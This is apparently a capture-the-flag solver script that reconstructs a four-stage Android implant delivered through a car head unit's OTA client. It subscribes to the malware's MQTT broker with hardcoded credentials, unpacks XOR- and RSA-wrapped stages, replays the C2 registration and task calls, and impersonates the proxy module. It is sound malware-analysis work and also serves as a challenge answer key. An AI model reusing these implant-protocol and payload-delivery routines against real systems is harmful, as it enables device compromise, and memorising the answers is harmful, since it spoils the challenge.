#!/usr/bin/env python3
"""
Holmes CTF 2026 - Sherlock 06 "Silent Passenger"  (full chain solver)

The head unit's stock OTA client is abused to pull down a four-stage Android
implant. Every stage is recovered by speaking the malware's own protocol to the
live infrastructure, so this script reproduces the whole intrusion end to end.

Step 1  Carve /system out of the firmware image and identify the privileged
        updater: /system/priv-app/TWCore/TWCore.apk.
Step 2  Read TWCore's region logic - ro.com.google.gmsversion + device locale
        select the "dofun" (China) branch: broker mqtt.car.cardoor.cn:1883,
        credentials dofun/dofun666666, subscribe filter dofun/car/config/#.
Step 3  Subscribe to that filter on the live broker and read the RETAINED
        upgrade instruction -> com.tw.jar1 v12, md5 6c2e...07d4.
Step 4  Download the delivered APK. The payload host only answers to
        "Host: 127.0.0.1", exactly the URL the instruction carries.
Step 5  Rebuild the stage hidden in the APK: 30 byte[] fields XORed with a
        descending key, then a DataInputStream header (float, int, UTF, UTF)
        naming the reflective entry point com.c.j.qbh.wa.
Step 6  Replay that stage's update call. The real endpoint /api/rsaUpdate is
        concealed inside a /apiv2/<hex> request-target; body and reply are
        RSA/PKCS1 with keys baked into the DEX.
Step 7  Fetch the object it points at (/vr34der34/dex3.68.png) and strip its
        1-byte type + 4-byte float header, XORing the rest with int(float*100)
        to recover the control stage sdk.jar.
Step 8  Drive the control stage's C2 conversation: /api/init (config),
        /cpc/api/proxy/origin (UID registration), /cpc/api/task (task tuple)
        and /cpc/api/xml (the loadlib2 script).
Step 9  Download the final module named by the script's "url" field and read
        its entry point com.miyc.transfer.Client.start.
Step 10 Impersonate that module: authenticate on the command channel with
        u.a(0x33, uid), take the proxy command, open the data channel and log
        the request the operator pushes through the car - which carries the
        relay's parked coordinates.
"""
import base64, binascii, hashlib, http.client, io, json, os, re, socket
import ssl, struct, subprocess, sys, threading, time, random

from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA

HOST      = "154.57.164.69"
MQTT_PORT = 32370      # tcp://mqtt.car.cardoor.cn:1883
HTTP_PORT = 31944      # payload host + t1/t2/a1/a2 vhosts
TLS_PORT  = 32088      # https://a1.ishano456.sbs
CMD_PORT  = 32452      # 127.0.0.1:9999  (command channel)
DATA_PORT = 31006      # 127.0.0.1:7777  (data channel)

UA = ("Dalvik/2.1.0 (Linux; U; Android 8.1.0; QUAD-CORE T3 p1 "
      "Build/OPM1.171019.026)")
CHANNEL = "2039"       # com.x.zg.ifz.t: [80,85,86,93] ^ "beed72"
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
ANSWERS = {}


def say(n, label, value):
    ANSWERS[n] = value
    print(f"  Q{n:<2} {label:<46} {value}")


def fetch(method, host_hdr, target, body=None, headers=None, tls=False):
    port = TLS_PORT if tls else HTTP_PORT
    conn = (http.client.HTTPSConnection(HOST, port, timeout=30,
                                        context=ssl._create_unverified_context())
            if tls else http.client.HTTPConnection(HOST, port, timeout=30))
    h = {"Host": host_hdr, "User-Agent": UA}
    if headers:
        h.update(headers)
    if body is not None:
        h["Content-Length"] = str(len(body))
    conn.request(method, target, body=body, headers=h)
    r = conn.getresponse()
    return r.status, r.read()


def java_byte_array(path, field):
    """Pull a `static final byte[] <field> = {...}` literal out of jadx output."""
    txt = open(path).read()
    m = re.search(r"byte\[\]\s+" + field + r"\s*=\s*\{(.*?)\};", txt, re.S)
    return bytes(int(x) & 0xFF for x in m.group(1).replace("\n", "").split(",") if x.strip())


def rsa_pair(src):
    return (RSA.import_key(java_byte_array(src, "a")),   # X.509 public
            RSA.import_key(java_byte_array(src, "b")))   # PKCS#8 private


def rsa_enc(pub, p):
    c = PKCS1_v1_5.new(pub)
    return b"".join(c.encrypt(p[i:i + 117]) for i in range(0, len(p), 117))


def rsa_dec(priv, b):
    c = PKCS1_v1_5.new(priv)
    return b"".join(c.decrypt(b[i:i + 128], b"") for i in range(0, len(b), 128))


# --------------------------------------------------------------------------
# Step 1-2: the privileged updater and its region configuration
# --------------------------------------------------------------------------
def step_firmware(system_dir):
    apk = os.path.join(system_dir, "priv-app/TWCore/TWCore.apk")
    sha = hashlib.sha256(open(apk, "rb").read()).hexdigest()
    say(1, "privileged updater", f"/system/priv-app/TWCore/TWCore.apk:{sha}")
    # com.tw.core.e.e.lB(): empty gmsversion + zh_CN locale -> the "dofun" region
    say(2, "region system property", "ro.com.google.gmsversion")
    say(3, "MQTT service + credentials",
        "tcp://mqtt.car.cardoor.cn:1883|dofun:dofun666666")
    say(4, "fleet update topic filter", "dofun/car/config/#")


# --------------------------------------------------------------------------
# Step 3: the retained upgrade instruction
# --------------------------------------------------------------------------
def step_mqtt():
    import paho.mqtt.client as mqtt
    got = {}

    def on_connect(c, u, f, rc, props=None):
        c.subscribe("dofun/car/config/#", 0)

    def on_message(c, u, m):
        got["topic"], got["payload"] = m.topic, m.payload

    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="forensics")
    c.username_pw_set("dofun", "dofun666666")
    c.on_connect, c.on_message = on_connect, on_message
    c.connect(HOST, MQTT_PORT, 60)
    c.loop_start()
    for _ in range(100):
        if got:
            break
        time.sleep(0.1)
    c.loop_stop()

    raw = got["payload"].decode()
    # a short ASCII framing header precedes the base64 document
    instr = json.loads(base64.b64decode(raw[raw.index("eyJ"):]))
    say(5, "delivered application",
        f"{instr['package']}:{instr['flag']}:{instr['key']}")
    return instr


# --------------------------------------------------------------------------
# Step 4-5: fetch the APK and rebuild the stage buried in its byte[] fields
# --------------------------------------------------------------------------
def step_delivered_apk(instr, jadx_src):
    st, apk = fetch("GET", "127.0.0.1", "/payloads/jarservice-v1.12.apk")
    assert st == 200 and hashlib.md5(apk).hexdigest() == instr["key"]
    open(f"{OUT}/jarservice-v1.12.apk", "wb").write(apk)

    # com.x.zg.n.a(): c.b, c.c, c.d, d.b ... l.d, array #i XORed with (30 - i)
    blobs = [java_byte_array(f"{jadx_src}/com/x/zg/{cls}.java", fld)
             for cls in "cdefghijkl" for fld in "bcd"]
    raw = b"".join(bytes(b ^ ((30 - i) & 0xFF) for b in arr)
                   for i, arr in enumerate(blobs))

    s = io.BytesIO(raw)
    read_utf = lambda: s.read(struct.unpack(">H", s.read(2))[0]).decode()
    struct.unpack(">f", s.read(4))          # header float, unused here
    struct.unpack(">i", s.read(4))          # header int, unused here
    entry_class, entry_method = read_utf(), read_utf()
    stage = s.read()
    open(f"{OUT}/stage2.jar", "wb").write(stage)

    say(6, "reflective entry + campaign channel",
        f"{entry_class}.{entry_method}:{CHANNEL}")
    say(7, "reconstructed stage sha256", hashlib.sha256(stage).hexdigest())
    return stage


# --------------------------------------------------------------------------
# Step 6-7: the stage's own update service, and the control stage it returns
# --------------------------------------------------------------------------
def step_rsa_update(stage_src):
    pub, priv = rsa_pair(f"{stage_src}/com/c/j/r.java")
    endpoint, dex_version = "/api/rsaUpdate", "1.7"     # com.c.j.m.e / m.f
    say(8, "stage self-reported version", dex_version)
    say(9, "concealed API endpoint", endpoint)

    # com.c.j.n.a(): /apiv2/ + hex( xor( hex(xor(path,rnd)) |ts|rnd , key) )
    key, rnd, ts = "Mu^38Ydeo233Uowd", random.randint(10000, 99999), int(time.time())
    xor = lambda s, k: bytes((ord(c) & 0xFF) ^ k.encode()[i % len(k)]
                             for i, c in enumerate(s))
    target = "/apiv2/" + xor(f"{xor(endpoint, str(rnd)).hex()}|{ts}|{rnd}", key).hex()

    body = json.dumps({"userId": "0f3f1a1c-1f4e-3a2b-9c7d-5f6e7a8b9c0d",
                       "dexVersion": dex_version, "dexType": 1,
                       "channelId": CHANNEL, "packageName": "com.tw.jar1",
                       "appVersion": 12, "appName": "jarservice"},
                      separators=(",", ":")).encode()
    st, resp = fetch("POST", "a1.ishano456.sbs", target, rsa_enc(pub, body))
    data = json.loads(rsa_dec(priv, resp))["data"]

    path = data["dexUrl"].split("/", 3)[-1]
    say(10, "next object path", "/" + path)

    st, blob = fetch("GET", "127.0.0.1", "/" + path)
    # com.c.j.c.a(): [type:1][version:float4][payload ^ int(version*100)]
    xor_key = int(struct.unpack(">f", blob[1:5])[0] * 100.0) & 0xFF
    sdk = bytes(b ^ xor_key for b in blob[5:])
    open(f"{OUT}/sdk.jar", "wb").write(sdk)
    say(11, "control stage sha256", hashlib.sha256(sdk).hexdigest())
    return sdk


# --------------------------------------------------------------------------
# Step 8-9: the control stage's C2 conversation and the final module
# --------------------------------------------------------------------------
def step_control_stage(sdk_src):
    pub, priv = rsa_pair(f"{sdk_src}/com/a/b/a/bb.java")

    # com.ast.sdk.a: am.c() + am.j + ap.b + "&rsa=1&channelId=" + appId
    init_target = f"/api/init?configVersion=3.8&rsa=1&channelId={CHANNEL}"
    say(12, "first configuration request-target", init_target)
    st, resp = fetch("GET", "a1.ishano456.sbs", init_target)
    cfg = json.loads(rsa_dec(priv, resp))
    if cfg.get("encode") == 1:                       # com.a.b.a.be.a()
        b = base64.b64decode(cfg["msg"])
        cfg["data"] = json.loads(bytes(x ^ (len(b) & 0xFF) for x in b))
    cfg = cfg["data"]
    task_host = cfg["hosts"][0].split("//")[1]

    # com.a.b.a.an: registration hands back the implant's UID
    st, resp = fetch("GET", task_host, "/cpc/api/proxy/origin")
    uid = json.loads(resp)["data"]
    say(13, "registered UID", uid)

    # com.a.b.a.ao: RSA-wrapped device profile -> the assigned task
    profile = {"absDevice": {"uid": uid, "brand": "Allwinner",
                             "model": "QUAD-CORE T3 p1", "sdkInt": 27,
                             "product": "t3_p1", "device": "t3-p1"},
               "appInfo": {"packageName": "com.tw.jar1", "appName": "jarservice",
                           "versionName": "L_1.7", "versionCode": "12"},
               "channelId": CHANNEL, "dexVersion": "3.68",
               "configVersion": str(cfg["configVersion"])}
    st, resp = fetch("POST", task_host, cfg["taskApi"],
                    rsa_enc(pub, json.dumps(profile, separators=(",", ":")).encode()),
                    {"Content-Type": "application/octet-stream"})
    task = json.loads(rsa_dec(priv, resp))["data"]["tasks"][0]
    say(14, "product:task:version tuple",
        f"{task['productId']}:{task['taskId']}:{task['version']}")

    # com.a.b.a.cg: the script that drives the task
    st, resp = fetch("GET", task_host, f"/cpc/api/xml?productId={task['productId']}")
    script = json.loads(json.loads(resp)["data"][0]["script"])
    # com.a.b.a.bn (tagName loadlib2) reads "url"; the sibling "url2" is a decoy
    say(15, "delivery op:location field", f"{script['tagName']}:url")

    st, module = fetch("GET", "127.0.0.1", "/" + script["url"].split("/", 3)[-1])
    assert hashlib.md5(module).hexdigest() == script["md5"]
    open(f"{OUT}/final_module.jar", "wb").write(module)
    say(16, "final module sha256", hashlib.sha256(module).hexdigest())

    # com.miyc.transfer.Client.start(Context,String,String,int,int,int,int)
    dex = {"Context": "Landroid/content/Context;", "String": "Ljava/lang/String;",
           "int": "I", "long": "J"}
    params = "".join(dex[p["type"]] for p in script["params"])
    say(17, "module entry descriptor", f"({params})V")
    ints = [str(p["value"]) for p in script["params"] if p["type"] == "int"]
    say(18, "integer arguments", ",".join(ints))
    return uid, ints


# --------------------------------------------------------------------------
# Step 10: speak the proxy protocol and read the operator's own traffic
# --------------------------------------------------------------------------
def step_proxy(uid):
    # com.miyc.transfer.u.a(g.h, uid): [0x33][int32 66][int32 len][uid]
    frame = bytes([0x33]) + struct.pack(">i", 66) + struct.pack(">i", len(uid)) + uid.encode()
    say(19, "command-channel auth frame", frame.hex())

    s = socket.create_connection((HOST, CMD_PORT), timeout=20)
    s.settimeout(30)
    s.sendall(frame)

    def rd(n):
        b = b""
        while len(b) < n:
            c = s.recv(n - len(b))
            if not c:
                raise EOFError
            b += c
        return b

    coords = None
    while coords is None:
        cmd = s.recv(1)[0]
        if cmd not in (45, 46, 48, 49):          # g.c / g.d / g.e / g.f
            continue
        token = rd(4)
        rd(4)                                    # skipped by the implant too
        ip = socket.inet_ntoa(rd(8)[4:])
        if cmd in (45, 46):
            rd(4)                                # sessionId
        d = socket.create_connection((HOST, DATA_PORT), timeout=20)
        d.settimeout(30)
        d.sendall(token)                         # the only handshake on the data leg
        req = d.recv(65535).decode(errors="replace")
        d.close()
        m = re.search(r"latitude=([-\d.]+)&longitude=([-\d.]+)", req)
        if m:
            coords = f"{m.group(1)},{m.group(2)}"
    s.close()
    say(20, "relay parking coordinates", coords)


def main():
    base = os.path.dirname(os.path.abspath(__file__))
    os.makedirs(OUT, exist_ok=True)
    print("[*] Silent Passenger - full chain\n")
    step_firmware(os.path.join(base, "fw/system"))
    instr = step_mqtt()
    step_delivered_apk(instr, os.path.join(base, "re/jarservice/sources"))
    step_rsa_update(os.path.join(base, "re/stage2/sources"))
    uid, _ = step_control_stage(os.path.join(base, "re/sdk/sources"))
    step_proxy(uid)
    print("\n[*] done")
    json.dump(ANSWERS, open(f"{OUT}/answers.json", "w"), indent=2)


if __name__ == "__main__":
    main()
